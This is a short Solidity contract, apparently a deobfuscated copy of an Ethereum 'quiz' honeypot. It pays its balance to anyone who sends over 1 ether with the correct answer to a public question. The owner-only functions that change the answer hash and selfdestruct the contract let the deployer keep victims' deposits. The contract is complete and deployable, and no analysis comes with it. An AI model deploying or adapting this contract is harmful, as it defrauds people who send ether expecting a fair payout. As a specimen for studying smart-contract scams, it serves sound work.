```solidity
pragma solidity ^0.4.20;

contract DeobfuscatedContract {
    struct OwnerStruct {
        address contractOwner;
    }
    
    OwnerStruct ownerData = OwnerStruct(address(0));
    
    string public challengeQuestion;
    bytes32 private correctAnswerHash;
    
    function submitAnswer(string answer) external payable {
        require(msg.sender == tx.origin);
        
        if (correctAnswerHash == keccak256(answer) && msg.value > 1 ether) {
            msg.sender.transfer(this.balance);
        }
    }
    
    function initializeContract(string question, string answer) public payable {
        if (correctAnswerHash == 0x0) {
            correctAnswerHash = keccak256(answer);
            challengeQuestion = question;
            ownerData.contractOwner = msg.sender;
        }
    }
    
    function destroyContract() public payable {
        require(msg.sender == ownerData.contractOwner);
        selfdestruct(msg.sender);
    }
    
    function updateQuestionAndAnswer(string question, bytes32 answerHash) public payable {
        if (msg.sender == ownerData.contractOwner) {
            challengeQuestion = question;
            correctAnswerHash = answerHash;
        }
    }
    
    function transferOwnership(address newOwner) public {
        if (msg.sender == ownerData.contractOwner) {
            ownerData.contractOwner = newOwner;
        }
    }
    
    function() public payable {}
}
```